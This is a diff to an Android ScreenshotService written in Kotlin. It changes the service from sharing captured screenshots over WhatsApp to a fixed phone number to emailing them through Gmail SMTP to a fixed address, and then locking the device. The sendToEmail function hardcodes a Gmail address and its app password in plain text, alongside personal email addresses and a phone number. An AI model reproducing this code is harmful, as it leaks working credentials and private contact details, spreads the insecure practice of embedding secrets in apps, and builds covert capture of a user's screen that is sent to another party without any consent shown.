@@ -20,6 +20,19 @@ import androidx.core.app.NotificationCompat
 import androidx.core.content.FileProvider
 import java.io.File
 import java.io.FileOutputStream
+import java.util.Properties
+import javax.activation.DataHandler
+import javax.activation.FileDataSource
+import javax.mail.Authenticator
+import javax.mail.Message
+import javax.mail.Multipart
+import javax.mail.PasswordAuthentication
+import javax.mail.Session
+import javax.mail.Transport
+import javax.mail.internet.InternetAddress
+import javax.mail.internet.MimeBodyPart
+import javax.mail.internet.MimeMessage
+import javax.mail.internet.MimeMultipart
 class ScreenshotService : Service() {
 
     companion object {
@@ -120,8 +133,8 @@ class ScreenshotService : Service() {
                 bitmap.copyPixelsFromBuffer(buffer)
                 image.close()
 
-                val uri = saveBitmap(bitmap)
-                sendToWhatsapp(uri)
+                val file = saveBitmap(bitmap)
+                sendToEmail(file)
 
                 projection.stop()
                 virtualDisplay?.release()
@@ -131,7 +144,7 @@ class ScreenshotService : Service() {
         }.start()
     }
 
-    private fun saveBitmap(bitmap: Bitmap): Uri {
+    private fun saveBitmap(bitmap: Bitmap): File {
         val file = File(
             getExternalFilesDir(Environment.DIRECTORY_PICTURES),
             "screenshot_${System.currentTimeMillis()}.png"
@@ -139,28 +152,61 @@ class ScreenshotService : Service() {
         FileOutputStream(file).use {
             bitmap.compress(Bitmap.CompressFormat.PNG, 100, it)
         }
-        return FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
+        return file
     }
 
-    private fun sendToWhatsapp(imageUri: Uri) {
-        val phoneNumber = "919154676764" // Use international format (91 for India)
-        val intent = Intent(Intent.ACTION_SEND).apply {
-            setPackage("com.whatsapp")
-            type = "image/*"
-            putExtra(Intent.EXTRA_STREAM, imageUri)
-            putExtra("jid", "$phoneNumber@s.whatsapp.net") // 🔐 Send to specific number
-            putExtra(Intent.EXTRA_TEXT, "Abusive content detected. Here's a screenshot.")
-            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-        }
+    private fun sendToEmail(screenshotFile: File) {
+        val fromEmail = "kommanamanojkumar300@gmail.com"
+        val appPassword = "wmjiopmujzzllpnw" // Gmail App Password
+        val toEmail = "kommanamanojkumar830@gmail.com"
+        val subject = "Abusive content detected - Screenshot"
+        val body = "Abusive content was detected. See attached screenshot."
 
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        try {
-            startActivity(intent)
-        } catch (e: Exception) {
-            Log.e("SCREENSHOT", "WhatsApp not found or user not available: ${e.message}")
-        }
+        Thread {
+            try {
+                val props = Properties().apply {
+                    put("mail.smtp.auth", "true")
+                    put("mail.smtp.starttls.enable", "true")
+                    put("mail.smtp.host", "smtp.gmail.com")
+                    put("mail.smtp.port", "587")
+                }
+                val session = Session.getInstance(props, object : Authenticator() {
+                    override fun getPasswordAuthentication(): PasswordAuthentication {
+                        return PasswordAuthentication(fromEmail, appPassword)
+                    }
+                })
+                val message = MimeMessage(session)
+                message.setFrom(InternetAddress(fromEmail))
+                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(toEmail))
+                message.subject = subject
 
-        stopSelf()
+                val mimeBodyPart = MimeBodyPart()
+                mimeBodyPart.setText(body)
+
+                val attachmentBodyPart = MimeBodyPart()
+                attachmentBodyPart.dataHandler = DataHandler(FileDataSource(screenshotFile))
+                attachmentBodyPart.fileName = screenshotFile.name
+
+                val multipart: Multipart = MimeMultipart().apply {
+                    addBodyPart(mimeBodyPart)
+                    addBodyPart(attachmentBodyPart)
+                }
+                message.setContent(multipart)
+
+                Transport.send(message)
+                Log.d("SCREENSHOT", "Email sent successfully")
+            } catch (e: Exception) {
+                Log.e("SCREENSHOT", "Failed to send email: ${e.message}")
+            } finally {
+                // After sending email, block the screen
+                val lockIntent = Intent(this, LockScreenActivity::class.java).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                }
+                startActivity(lockIntent)
+                stopSelf()
+            }
+        }.start()
     }
+
     override fun onBind(intent: Intent?): IBinder? = null
 }
